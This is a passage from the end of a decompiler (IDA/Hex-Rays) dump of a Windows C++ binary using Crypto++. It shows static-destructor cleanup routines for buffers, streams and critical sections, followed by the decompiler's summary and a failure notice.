  off_4E805C = &CryptoPP::EC2NPoint::`vftable';
  v0 = dword_4E8078;
  v1 = dword_4E807C;
  if ( dword_4E8074 < (unsigned int)dword_4E8078 )
    v0 = dword_4E8074;
  memset(dword_4E807C, 0, 4 * v0);
  j_j___free_base(v1);
  v2 = dword_4E8068;
  v3 = dword_4E806C;
  if ( dword_4E8064 < (unsigned int)dword_4E8068 )
    v2 = dword_4E8064;
  memset(dword_4E806C, 0, 4 * v2);
  j_j___free_base(v3);
}
// 4BAAE4: using guessed type void *CryptoPP::EC2NPoint::`vftable';
// 4E805C: using guessed type void **off_4E805C;
// 4E8064: using guessed type int dword_4E8064;
// 4E8068: using guessed type int dword_4E8068;
// 4E8074: using guessed type int dword_4E8074;
// 4E8078: using guessed type int dword_4E8078;

//----- (004B7AF0) --------------------------------------------------------
void __cdecl sub_4B7AF0()
{
  sub_439E50(&off_4E8084);
}
// 4E8084: using guessed type void **off_4E8084;

//----- (004B7B00) --------------------------------------------------------
void __cdecl sub_4B7B00()
{
  _DWORD *v0; // esi
  _DWORD *v1; // eax

  v0 = (_DWORD *)dword_4F0114;
  if ( dword_4F0114 )
  {
    v1 = *(_DWORD **)dword_4F0114;
    if ( *(_DWORD *)dword_4F0114 )
    {
      if ( ((*(_DWORD *)(dword_4F0114 + 8) - (_DWORD)v1) & 0xFFFFFFFE) >= 0x1000 )
      {
        if ( (unsigned int)v1 - *(v1 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v1 = (_DWORD *)*(v1 - 1);
      }
      sub_46C87D(v1);
      *v0 = 0;
      v0[1] = 0;
      v0[2] = 0;
    }
    sub_46C87D(v0);
  }
  dword_4F0114 = 0;
}
// 4F0114: using guessed type int dword_4F0114;

//----- (004B7B70) --------------------------------------------------------
void __cdecl sub_4B7B70()
{
  if ( dword_4F011C )
    (**(void (__thiscall ***)(int, int))dword_4F011C)(dword_4F011C, 1);
  dword_4F011C = 0;
}
// 4F011C: using guessed type int dword_4F011C;

//----- (004B7B90) --------------------------------------------------------
void __cdecl sub_4B7B90()
{
  sub_468A70(&off_4E80C0);
}
// 4E80C0: using guessed type void **off_4E80C0;

//----- (004B7BA0) --------------------------------------------------------
void __cdecl sub_4B7BA0()
{
  *(int *)((char *)&dword_4F0158 + *(_DWORD *)(dword_4F0158 + 4)) = (int)&std::ostream::`vftable';
  *(int *)((char *)&dword_4F0154 + *(_DWORD *)(dword_4F0158 + 4)) = *(_DWORD *)(dword_4F0158 + 4) - 8;
  dword_4F0160[0] = (int)&std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)dword_4F0160);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B857C: using guessed type void *std::ostream::`vftable';
// 4F0154: using guessed type int dword_4F0154;
// 4F0158: using guessed type int dword_4F0158;
// 4F0160: using guessed type int dword_4F0160[18];

//----- (004B7C12) --------------------------------------------------------
void __cdecl sub_4B7C12()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(dword_4E80F8, 0xFFFFFFFF) < 0 )
  {
    v0 = (struct _RTL_CRITICAL_SECTION *)&unk_4F01C8;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&unk_4F0288 );
  }
}
// 46BDE6: using guessed type _DWORD __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection);
// 4E80F8: using guessed type signed __int32 dword_4E80F8[23];

//----- (004B7C1C) --------------------------------------------------------
void __cdecl sub_4B7C1C()
{
  sub_41D550(byte_4F0290);
}

//----- (004B7C26) --------------------------------------------------------
void __cdecl sub_4B7C26()
{
  sub_41C100((int)&dword_4F02E0);
}
// 4F02E0: using guessed type int dword_4F02E0;

//----- (004B7C30) --------------------------------------------------------
void __cdecl sub_4B7C30()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(dword_4E80F8, 0xFFFFFFFF) < 0 )
  {
    v0 = (struct _RTL_CRITICAL_SECTION *)&unk_4F01C8;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&unk_4F0288 );
  }
}
// 46BDE6: using guessed type _DWORD __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection);
// 4E80F8: using guessed type signed __int32 dword_4E80F8[23];

//----- (004B7C3A) --------------------------------------------------------
void __cdecl sub_4B7C3A()
{
  std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t((std::_Fac_tidy_reg_t *)&unk_4F035C);
}
// 469D25: using guessed type void __thiscall std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t(std::_Fac_tidy_reg_t *__hidden this);

//----- (004B7C44) --------------------------------------------------------
void __cdecl sub_4B7C44()
{
  sub_401E00(&dword_4F0354);
}
// 4F0354: using guessed type _DWORD dword_4F0354;

//----- (004B7C4E) --------------------------------------------------------
void __cdecl sub_4B7C4E()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(dword_4E80F8, 0xFFFFFFFF) < 0 )
  {
    v0 = (struct _RTL_CRITICAL_SECTION *)&unk_4F01C8;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&unk_4F0288 );
  }
}
// 46BDE6: using guessed type _DWORD __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection);
// 4E80F8: using guessed type signed __int32 dword_4E80F8[23];

//----- (004B7C58) --------------------------------------------------------
void __cdecl sub_4B7C58()
{
  sub_41D4E0((char *)dword_4F0378);
}
// 4F0378: using guessed type int dword_4F0378[5];

//----- (004B7C62) --------------------------------------------------------
void __cdecl sub_4B7C62()
{
  sub_41A9E0(&dword_4F03C8);
}
// 4F03C8: using guessed type int dword_4F03C8;

//----- (004B7C6C) --------------------------------------------------------
void __cdecl sub_4B7C6C()
{
  sub_41D550((char *)dword_4F0428);
}
// 4F0428: using guessed type int dword_4F0428[5];

//----- (004B7C76) --------------------------------------------------------
void __cdecl sub_4B7C76()
{
  sub_41C100((int)&dword_4F0478);
}
// 4F0478: using guessed type int dword_4F0478;

//----- (004B7C80) --------------------------------------------------------
void __cdecl sub_4B7C80()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(dword_4E80F8, 0xFFFFFFFF) < 0 )
  {
    v0 = (struct _RTL_CRITICAL_SECTION *)&unk_4F01C8;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&unk_4F0288 );
  }
}
// 46BDE6: using guessed type _DWORD __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection);
// 4E80F8: using guessed type signed __int32 dword_4E80F8[23];

//----- (004B7C8A) --------------------------------------------------------
void __cdecl sub_4B7C8A()
{
  _Init_atexit::~_Init_atexit((_Init_atexit *)&unk_4F0771);
}
// 46BE27: using guessed type void __thiscall _Init_atexit::~_Init_atexit(_Init_atexit *__hidden this);

//----- (004B7C94) --------------------------------------------------------
void __cdecl sub_4B7C94()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(dword_4E80F8, 0xFFFFFFFF) < 0 )
  {
    v0 = (struct _RTL_CRITICAL_SECTION *)&unk_4F01C8;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&unk_4F0288 );
  }
}
// 46BDE6: using guessed type _DWORD __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection);
// 4E80F8: using guessed type signed __int32 dword_4E80F8[23];

//----- (004B7C9E) --------------------------------------------------------
void __cdecl sub_4B7C9E()
{
  void *v0; // esi

  v0 = (void *)dword_4F0BB0;
  if ( dword_4F0BB0 )
  {
    sub_46F3E4((char *)dword_4F0BB0);
    sub_46C87D(v0);
    dword_4F0BB0 = 0;
  }
}
// 4F0BB0: using guessed type int dword_4F0BB0;

// nfuncs=4089 queued=2913 decompiled=2913 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 2913 function(s)"
